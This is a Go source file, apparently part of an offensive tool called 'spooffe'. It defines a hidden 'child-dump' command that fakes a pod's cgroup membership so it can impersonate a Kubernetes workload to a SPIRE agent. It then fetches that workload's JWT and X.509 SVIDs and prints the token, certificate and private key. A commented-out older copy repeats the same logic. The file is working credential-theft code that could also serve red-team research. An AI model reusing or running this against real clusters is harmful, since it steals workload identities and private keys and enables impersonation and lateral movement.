// cmd/child.go
package dump

import (
	"encoding/json"
	"fmt"
	"os"
	"spooffe/extractor"
	"spooffe/spiffe"
	"spooffe/utils"

	"github.com/spf13/cobra"
)

var (
	timeoutSecChild int
)

func NewChildDumpCmd() *cobra.Command {
	cmd := &cobra.Command{
		Use:    "child-dump",
		Short:  "Internal command to spoof and fetch SVIDs (used for concurrency)",
		Hidden: true, // Hide from help output - internal use only
		Run: func(cmd *cobra.Command, args []string) {
			podUID, _ := cmd.Flags().GetString("pod")
			containerID, _ := cmd.Flags().GetString("container")
			spireSocketPath, _ := cmd.Flags().GetString("socket")
			jwt, _ := cmd.Flags().GetBool("jwt")
			x509, _ := cmd.Flags().GetBool("x509")

			pair := extractor.PodContainerPair{PodUID: podUID, ContainerID: containerID}
			var logs []string

			groupPath, err := spiffe.SpoofCgroup(podUID, containerID)
			if err != nil {
				logs = append(logs, utils.FormatLogLine("Failed to spoof cgroup:", err, "error"))
			} else {
				logs = append(logs, utils.FormatLogLine("Created fake cgroup:", groupPath, "info"))
			}

			if data, err := os.ReadFile("/proc/self/cgroup"); err == nil {
				logs = append(logs, utils.FormatLogLine("/proc/self/cgroup:\n", string(data), "info"))
			}

			// NOTE: use timeoutSecChild (not timeoutSec)
			if jwt {
				token, err := spiffe.FetchJWT(pair, spireSocketPath, timeoutSecChild)
				if err != nil {
					logs = append(logs, utils.FormatLogLine("JWT fetch failed:", err, "error"))
				} else {
					logs = append(logs, utils.FormatLogLine("Fetched JWT:", token, "success"))
				}
			}

			if x509 {
				certPEM, keyPEM, err := spiffe.FetchX509(pair, spireSocketPath, timeoutSecChild)
				if err != nil {
					logs = append(logs, utils.FormatLogLine("X.509 fetch failed:", err, "error"))
				} else {
					logs = append(logs, utils.FormatLogLine("Fetched X.509 certificate", nil, "success"))
					logs = append(logs, utils.FormatLogLine("X.509 cert PEM:\n", string(certPEM), "info"))
					logs = append(logs, utils.FormatLogLine("X.509 key PEM:\n", string(keyPEM), "info"))
				}
			}

			output := utils.PodLog{
				PodUID:      podUID,
				ContainerID: containerID,
				Logs:        logs,
			}
			enc := json.NewEncoder(os.Stdout)
			if err := enc.Encode(output); err != nil {
				fmt.Fprintf(os.Stderr, "Failed to encode child output: %v\n", err)
				os.Exit(1)
			}
		},
	}

	// Flags live here (not in a separate init()).
	cmd.Flags().String("pod", "", "Pod UID")
	cmd.Flags().String("container", "", "Container ID")
	// Use StringP to add shorthand; second arg was wrong before.
	cmd.Flags().StringP("socket", "s", "/run/spire/sockets/agent.sock", "SPIRE agent socket path")
	cmd.Flags().IntVar(&timeoutSecChild, "timeout", 10, "Timeout in seconds")
	cmd.Flags().Bool("jwt", false, "Fetch JWT")
	cmd.Flags().Bool("x509", false, "Fetch X.509")
	_ = cmd.MarkFlagRequired("pod")
	_ = cmd.MarkFlagRequired("container")

	return cmd
}

// func NewChildDumpCmd() *cobra.Command {

// 	var childDumpCmd = &cobra.Command{
// 		Use:   "child-dump",
// 		Short: "Internal command to spoof and fetch SVIDs (used for concurrency)",
// 		Run: func(cmd *cobra.Command, args []string) {
// 			podUID, _ := cmd.Flags().GetString("pod")
// 			containerID, _ := cmd.Flags().GetString("container")
// 			spireSocketPath, _ := cmd.Flags().GetString("socket")
// 			jwt, _ := cmd.Flags().GetBool("jwt")
// 			x509, _ := cmd.Flags().GetBool("x509")

// 			pair := extractor.PodContainerPair{PodUID: podUID, ContainerID: containerID}
// 			var logs []string

// 			groupPath, err := spiffe.SpoofCgroup(podUID, containerID)
// 			if err != nil {
// 				logs = append(logs, utils.FormatLogLine("Failed to spoof cgroup:", err, "error"))
// 			} else {
// 				logs = append(logs, utils.FormatLogLine("Created fake cgroup:", groupPath, "info"))
// 			}

// 			if data, err := os.ReadFile("/proc/self/cgroup"); err == nil {
// 				logs = append(logs, utils.FormatLogLine("/proc/self/cgroup:\n", string(data), "info"))
// 			}

// 			// timeoutSecInt, err := strconv.Atoi(timeoutSec)
// 			// if err != nil {
// 			// 	// handle error
// 			// 	timeoutSecInt = 10
// 			// }

// 			if jwt {
// 				token, err := spiffe.FetchJWT(pair, spireSocketPath, timeoutSec)
// 				if err != nil {
// 					logs = append(logs, utils.FormatLogLine("JWT fetch failed:", err, "error"))
// 				} else {
// 					logs = append(logs, utils.FormatLogLine("Fetched JWT:", token, "success"))
// 				}
// 			}

// 			if x509 {
// 				certPEM, keyPEM, err := spiffe.FetchX509(pair, spireSocketPath, timeoutSec)
// 				if err != nil {
// 					logs = append(logs, utils.FormatLogLine("X.509 fetch failed:", err, "error"))
// 				} else {
// 					logs = append(logs, utils.FormatLogLine("Fetched X.509 certificate", nil, "success"))
// 					logs = append(logs, utils.FormatLogLine("X.509 cert PEM:\n", string(certPEM), "info"))
// 					logs = append(logs, utils.FormatLogLine("X.509 key PEM:\n", string(keyPEM), "info"))
// 				}
// 			}

// 			output := utils.PodLog{
// 				PodUID:      podUID,
// 				ContainerID: containerID,
// 				Logs:        logs,
// 			}
// 			enc := json.NewEncoder(os.Stdout)
// 			if err := enc.Encode(output); err != nil {
// 				fmt.Fprintf(os.Stderr, "Failed to encode child output: %v\n", err)
// 				os.Exit(1)
// 			}
// 		},
// 	}

// 	return childDumpCmd

// }

// func init() {
// 	childDumpCmd.Flags().String("pod", "", "Pod UID")
// 	childDumpCmd.Flags().String("container", "", "Container ID")
// 	childDumpCmd.Flags().String("socket", "-s", "Spire socket path")
// 	childDumpCmd.Flags().IntVar(&timeoutSecChild, "timeout", 10, "Timeout in seconds")
// 	childDumpCmd.Flags().Bool("jwt", false, "Fetch JWT")
// 	childDumpCmd.Flags().Bool("x509", false, "Fetch X.509")
// 	childDumpCmd.MarkFlagRequired("pod")
// 	childDumpCmd.MarkFlagRequired("container")

// 	//rootCmd.AddCommand(childDumpCmd)
// }
